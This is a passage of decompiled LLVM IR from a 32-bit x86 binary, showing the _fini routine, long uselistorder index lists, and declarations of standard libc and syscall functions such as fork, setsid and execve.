  uselistorder label %dec_label_pc_8057f76, { 1, 0 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v0_8057f8b = load i32, i32* @ebx, align 4
  %v1_8057f8c = call i32 @__get_pc_thunk_bx(i32 %v0_8057f8b)
  store i32 %v1_8057f8c, i32* @eax, align 4
  %v0_8057f97 = call i32 @__do_global_dtors_aux()
  ret i32 %v0_8057f97

; uselistorder directives
  uselistorder i32* @eax, { 16, 114, 3, 34, 116, 0, 5, 117, 118, 4, 119, 1, 33, 2, 115, 120, 35, 121, 64, 65, 67, 17, 66, 122, 124, 123, 7, 8, 125, 126, 127, 36, 128, 129, 130, 131, 132, 133, 134, 135, 136, 37, 137, 138, 139, 140, 141, 38, 39, 142, 40, 143, 41, 42, 144, 187, 145, 43, 146, 44, 147, 148, 149, 45, 150, 6, 46, 47, 151, 152, 48, 153, 49, 154, 155, 50, 51, 52, 156, 157, 158, 159, 53, 160, 161, 162, 163, 54, 175, 189, 190, 60, 191, 192, 194, 61, 195, 9, 193, 13, 15, 188, 103, 18, 68, 69, 109, 70, 176, 178, 179, 177, 180, 181, 183, 184, 182, 173, 58, 10, 11, 164, 166, 165, 167, 168, 170, 63, 169, 171, 172, 19, 71, 72, 73, 74, 75, 20, 76, 77, 21, 22, 78, 79, 80, 81, 23, 82, 24, 83, 55, 84, 56, 85, 57, 86, 25, 87, 26, 88, 27, 89, 28, 29, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 30, 100, 31, 101, 102, 32, 62, 104, 105, 106, 107, 108, 110, 111, 112, 113, 59, 174, 196, 185, 186, 12, 14 }
  uselistorder i32 (i32)* @__get_pc_thunk_bx, { 1, 0 }
  uselistorder i32 0, { 377, 1270, 1271, 1272, 151, 152, 953, 1273, 1274, 954, 1275, 18, 19, 20, 70, 955, 1276, 1279, 1277, 1278, 956, 1280, 153, 1281, 1282, 1283, 291, 1284, 1285, 1286, 21, 72, 1289, 1296, 1290, 1291, 22, 62, 1292, 1293, 1294, 957, 1295, 71, 142, 143, 144, 1287, 1288, 154, 1297, 1298, 1300, 1301, 1299, 1302, 292, 1303, 1304, 1305, 1306, 1307, 1308, 155, 156, 958, 378, 379, 125, 1069, 959, 1070, 1071, 75, 76, 1072, 1073, 1074, 920, 1075, 74, 960, 73, 961, 157, 0, 1, 962, 158, 159, 963, 964, 965, 160, 966, 1311, 967, 1309, 282, 1310, 380, 381, 161, 2, 3, 968, 1312, 1313, 1314, 1315, 1316, 382, 969, 970, 162, 1317, 23, 77, 1188, 126, 127, 971, 1318, 78, 972, 24, 163, 1319, 79, 973, 1320, 974, 1322, 1321, 268, 975, 976, 1323, 1325, 1324, 269, 977, 1326, 164, 1327, 978, 1328, 1329, 1330, 1331, 1332, 1333, 1334, 1335, 1336, 1337, 293, 1338, 979, 980, 1339, 1340, 1341, 15, 294, 166, 165, 1342, 1343, 295, 1344, 1345, 1346, 981, 1347, 1348, 1349, 1350, 167, 1351, 982, 1352, 1353, 168, 983, 169, 383, 1354, 1355, 1356, 1357, 134, 25, 1358, 80, 1359, 1360, 1361, 1362, 1363, 1364, 1370, 1371, 1372, 1373, 1365, 1366, 1367, 1368, 1369, 81, 82, 984, 1374, 1375, 83, 84, 85, 985, 1376, 1377, 1378, 1379, 1380, 1381, 1382, 1383, 1384, 1385, 1386, 1387, 1388, 1389, 1390, 1391, 1392, 1393, 170, 1537, 1538, 171, 1539, 1540, 1541, 86, 135, 296, 145, 986, 136, 1394, 172, 1395, 26, 137, 128, 1396, 270, 173, 1397, 129, 1398, 987, 1399, 384, 1400, 1401, 1402, 1403, 1404, 1405, 1406, 1407, 174, 988, 1408, 1409, 1410, 1411, 175, 1412, 989, 176, 261, 385, 177, 990, 991, 992, 297, 1413, 1414, 1415, 1416, 298, 285, 286, 1417, 1418, 1419, 1420, 1421, 1422, 993, 299, 1423, 178, 994, 1424, 179, 300, 301, 1425, 1426, 995, 1427, 1428, 1429, 1430, 121, 1612, 1613, 1614, 1615, 130, 271, 138, 1431, 272, 996, 997, 998, 1432, 180, 1433, 1549, 1564, 1565, 1566, 386, 1567, 1217, 1568, 1617, 1076, 1618, 1619, 1620, 1077, 1621, 1569, 1570, 1622, 181, 1623, 1634, 1635, 27, 150, 999, 28, 1000, 1001, 1646, 1650, 273, 1651, 182, 880, 387, 388, 4, 1624, 1625, 1626, 183, 1037, 919, 184, 1002, 1218, 5, 302, 303, 185, 1219, 1220, 186, 187, 1222, 1221, 1223, 1224, 389, 881, 1225, 1227, 1226, 1228, 1627, 1628, 188, 1003, 1633, 1110, 1111, 1112, 1113, 1004, 1005, 1114, 366, 1006, 304, 189, 190, 191, 390, 391, 131, 392, 1230, 1229, 393, 1237, 192, 193, 1007, 1078, 1008, 1079, 194, 1009, 195, 1010, 1239, 87, 1240, 1241, 1242, 6, 1011, 1257, 394, 1080, 1081, 1082, 1083, 1012, 196, 1636, 882, 197, 305, 1638, 1641, 1640, 1573, 1574, 1575, 1576, 1577, 306, 1578, 1579, 1580, 395, 1571, 396, 1572, 397, 1013, 1014, 398, 883, 1015, 399, 884, 198, 1016, 1581, 1582, 199, 200, 400, 885, 147, 1583, 1584, 1585, 201, 202, 401, 886, 146, 1586, 274, 1587, 132, 1588, 1589, 1591, 1017, 1590, 7, 1084, 8, 1639, 1231, 1232, 1233, 1234, 1236, 1235, 9, 307, 1550, 1551, 1552, 1511, 1018, 308, 1512, 1019, 1513, 1514, 1515, 1517, 1518, 1519, 1520, 1521, 1522, 1523, 1524, 1542, 1525, 203, 204, 1020, 1021, 309, 1647, 1649, 29, 205, 1434, 1435, 148, 1436, 206, 1022, 1437, 275, 139, 1438, 88, 1516, 64, 310, 311, 207, 1439, 1440, 1441, 1442, 1443, 1444, 1445, 1446, 1447, 1448, 1449, 1450, 208, 1023, 1451, 312, 1452, 1453, 1454, 1455, 1456, 30, 31, 1024, 287, 288, 1457, 1458, 1459, 1460, 32, 1461, 1462, 1463, 33, 1025, 1464, 34, 35, 209, 1026, 1465, 1466, 1467, 1470, 1468, 1469, 36, 65, 89, 1471, 1472, 1473, 1474, 367, 1475, 1476, 210, 1477, 211, 1478, 1027, 276, 1479, 212, 1480, 1028, 1481, 1482, 1484, 1485, 1486, 1487, 1488, 1489, 213, 1029, 1030, 214, 1490, 1491, 1031, 1492, 1493, 1494, 1495, 1496, 1032, 1497, 1498, 313, 1033, 314, 1499, 1500, 1501, 1502, 1503, 1504, 37, 90, 91, 92, 1034, 1505, 215, 1035, 1506, 887, 1507, 1508, 216, 1036, 133, 63, 122, 1483, 277, 1509, 1510, 1629, 1630, 278, 1632, 1631, 93, 402, 315, 1238, 1616, 217, 1243, 1637, 1085, 1528, 1548, 1086, 1555, 1642, 149, 316, 1610, 1648, 1556, 1611, 1645, 1557, 1265, 1558, 1559, 1087, 1102, 1643, 1644, 921, 262, 1088, 263, 1089, 1091, 1090, 1092, 1093, 922, 407, 408, 320, 321, 319, 1094, 38, 218, 219, 317, 403, 220, 923, 1095, 221, 318, 1096, 1097, 279, 404, 888, 1098, 405, 222, 1099, 223, 224, 225, 322, 409, 410, 1100, 1101, 406, 412, 413, 411, 226, 340, 95, 1104, 414, 1103, 416, 417, 94, 415, 418, 419, 227, 1105, 323, 1106, 368, 1107, 1108, 1109, 324, 140, 444, 889, 925, 449, 450, 325, 283, 284, 924, 1115, 926, 451, 452, 441, 1116, 1118, 442, 443, 1117, 103, 1119, 369, 1120, 1121, 1122, 1123, 927, 453, 454, 438, 1124, 1126, 439, 440, 1125, 102, 1127, 928, 455, 456, 435, 1128, 1130, 436, 437, 1129, 101, 1131, 929, 457, 458, 432, 890, 1132, 1134, 433, 434, 891, 1133, 100, 1135, 930, 459, 460, 429, 892, 1136, 1138, 430, 893, 431, 894, 1137, 99, 1139, 931, 461, 462, 426, 895, 1140, 1142, 427, 896, 428, 897, 1141, 98, 1143, 1144, 1145, 1146, 1147, 1148, 1149, 932, 463, 464, 423, 898, 1150, 1152, 424, 899, 425, 900, 1151, 97, 1153, 933, 465, 466, 420, 901, 1154, 1156, 421, 902, 422, 903, 1155, 96, 1157, 934, 467, 468, 445, 904, 935, 936, 469, 470, 446, 905, 228, 1158, 1159, 937, 471, 472, 1160, 1161, 938, 473, 474, 939, 475, 476, 447, 1162, 940, 477, 478, 448, 906, 1163, 941, 479, 480, 942, 481, 482, 943, 505, 506, 104, 1174, 40, 1164, 1165, 1166, 907, 342, 1167, 1168, 1169, 1170, 908, 341, 1171, 1172, 1173, 39, 1175, 1176, 1177, 16, 105, 1184, 42, 1178, 1179, 1180, 909, 343, 1181, 1182, 1183, 41, 1185, 1186, 1187, 17, 1189, 344, 1190, 43, 345, 1191, 264, 1192, 944, 483, 484, 945, 485, 486, 946, 487, 488, 947, 489, 490, 948, 491, 492, 265, 949, 493, 494, 1193, 370, 1194, 1195, 1196, 1197, 326, 1198, 910, 1199, 1200, 266, 141, 1201, 1202, 44, 347, 1203, 371, 1204, 1205, 1206, 1207, 10, 1208, 327, 1209, 229, 45, 346, 1210, 1211, 1212, 1213, 289, 496, 230, 495, 911, 912, 231, 46, 1214, 1215, 47, 66, 232, 233, 234, 1216, 328, 329, 235, 267, 1038, 1039, 1040, 1041, 1042, 1043, 1044, 1045, 1046, 1047, 1048, 1049, 1050, 1051, 1052, 1053, 1054, 1055, 1056, 1057, 1058, 1059, 1060, 913, 1061, 1062, 914, 351, 1063, 1064, 348, 349, 350, 1065, 1066, 915, 498, 1067, 1244, 1245, 108, 11, 497, 1246, 106, 107, 330, 916, 12, 48, 49, 1247, 109, 67, 1248, 352, 372, 236, 237, 238, 353, 917, 1249, 499, 1250, 1251, 1252, 331, 1253, 114, 1254, 1255, 1256, 68, 110, 111, 112, 113, 918, 1258, 239, 240, 241, 242, 1259, 1261, 1262, 1263, 243, 1264, 244, 245, 246, 354, 1260, 373, 500, 501, 332, 355, 333, 13, 334, 950, 502, 1266, 247, 248, 249, 250, 335, 1267, 251, 252, 356, 1268, 1269, 253, 290, 1526, 503, 504, 1527, 1529, 1530, 1531, 951, 357, 254, 255, 359, 1532, 256, 358, 1533, 115, 50, 69, 51, 1534, 336, 116, 117, 507, 124, 1536, 337, 1535, 509, 510, 118, 508, 511, 512, 1543, 1544, 374, 1545, 1546, 52, 1547, 53, 375, 119, 952, 1553, 257, 258, 513, 1554, 259, 338, 1560, 1561, 1562, 1563, 339, 54, 1592, 1593, 1594, 514, 515, 1604, 55, 56, 123, 57, 362, 363, 1595, 1596, 1597, 1598, 280, 360, 361, 364, 1599, 1600, 1601, 1602, 58, 59, 120, 1603, 376, 60, 61, 1605, 1606, 365, 14, 1607, 1608, 1609, 260, 1068, 281, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 845, 846, 847, 848, 849, 850, 851, 852, 853, 854, 855, 856, 857, 858, 859, 860, 861, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 876, 877, 878, 879, 1652, 1653, 1654, 1655, 1656, 1657, 1658, 1659 }
  uselistorder i32* @ebx, {}
}

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #1

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare i32 @_strlen(i8*) local_unnamed_addr

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

declare i32 @_strncmp(i8*, i8*, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare i32 @unknown_0(i32) local_unnamed_addr

declare i32 @vfork() local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork(i32) local_unnamed_addr

declare i32 @getpid(i32) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @pipe([2 x i32]) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @setsid(i32) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @execve(i8*, [1 x i8*], [1 x i8*]) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i64 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i8 @__decompiler_undefined_function_3() local_unnamed_addr

declare i16 @__decompiler_undefined_function_4() local_unnamed_addr

declare i16* @__decompiler_undefined_function_5() local_unnamed_addr

declare i8** @__decompiler_undefined_function_6() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_7() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_8() local_unnamed_addr

declare %timespec* @__decompiler_undefined_function_9() local_unnamed_addr

declare x86_fp80 @__decompiler_undefined_function_10() local_unnamed_addr

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
